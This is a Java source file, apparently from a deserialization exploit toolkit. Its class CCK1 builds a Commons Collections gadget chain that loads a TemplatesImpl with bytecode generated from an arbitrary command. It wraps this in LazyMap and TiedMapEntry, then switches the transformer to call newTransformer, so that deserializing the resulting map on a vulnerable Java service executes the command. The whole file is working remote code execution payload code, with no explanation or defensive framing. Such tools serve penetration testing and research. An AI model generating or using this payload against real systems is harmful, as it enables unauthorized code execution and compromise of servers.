package gadget;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import util.ASMUtil;
import util.CommonUtil;

import java.util.HashMap;
import java.util.Map;

/**
 * name: cck1
 */
public class CCK1 implements ObjectPayload {
    @Override
    public Object getObjectPayload(String command) {
        TemplatesImpl templates = ASMUtil.createTemplates(command);
        InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
        HashMap<String, String> innerMap = new HashMap();
        Map m = LazyMap.decorate(innerMap, transformer);

        Map outerMap = new HashMap();
        TiedMapEntry tied = new TiedMapEntry(m, templates);
        outerMap.put(tied, "t");
        // clear the inner map data, this is important
        innerMap.clear();
        CommonUtil.setFieldValue(transformer, "iMethodName", "newTransformer");

        return outerMap;
    }
}
